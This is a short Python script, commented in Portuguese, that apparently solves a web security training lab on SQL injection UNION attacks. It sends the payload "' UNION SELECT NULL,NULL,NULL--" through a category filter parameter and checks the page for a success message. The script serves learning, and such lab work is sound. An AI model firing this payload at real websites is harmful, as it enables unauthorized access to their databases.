"""
Lab: SQL injection UNION attack, determining the number of columns returned by the query

Objetivo:
Explorar uma SQL Injection UNION para determinar o número de colunas retornadas pela consulta original.
"""

import requests

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

PAYLOAD = "' UNION SELECT NULL,NULL,NULL--" 

target_url = input("URL do laboratório: ").rstrip("/")

session = requests.Session()

requests.get(
    f"{target_url}/filter", 
    params={"category": f"Pets{PAYLOAD}"}
)

check = session.get(target_url)

if "Congratulations" in check.text:
    print(f"{GREEN}[+] Vulnerabilidade explorada.{RESET}")
else:
    print(f"{RED}[-] Exploração não confirmada.{RESET}")